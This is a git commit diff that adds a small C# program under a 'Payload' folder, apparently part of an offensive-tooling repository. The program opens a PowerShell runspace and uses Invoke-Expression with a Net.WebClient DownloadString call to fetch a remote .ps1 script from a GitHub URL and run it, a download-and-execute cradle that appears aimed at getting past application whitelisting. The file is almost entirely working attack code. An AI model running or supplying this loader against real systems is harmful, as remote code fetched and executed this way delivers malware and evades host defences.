6637986a0141b15ea98d4211e1ddd03050981b3c
NotSurprised <roro8016489@gmail.com>
2020-03-20 17:12:49 +0800

    20200320

---
+++ Payload/Csharp2Powershell/Csharp2Powershell/Program.cs
@@ -0,0 +1,15 @@
+﻿using System;
+using System.Management.Automation;
+namespace Powershell
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            PowerShell ps = PowerShell.Create();
+            ps.AddCommand("Invoke-Expression");
+            ps.AddArgument("IEX (New-Object Net.WebClient).DownloadString('https://github.com/NotSurprised/LoremIpsumDolorSitAmetconsEctetur/raw/master/Payload/WhiteListTestScript.ps1')");
+            ps.Invoke();
+        }
+    }
+}
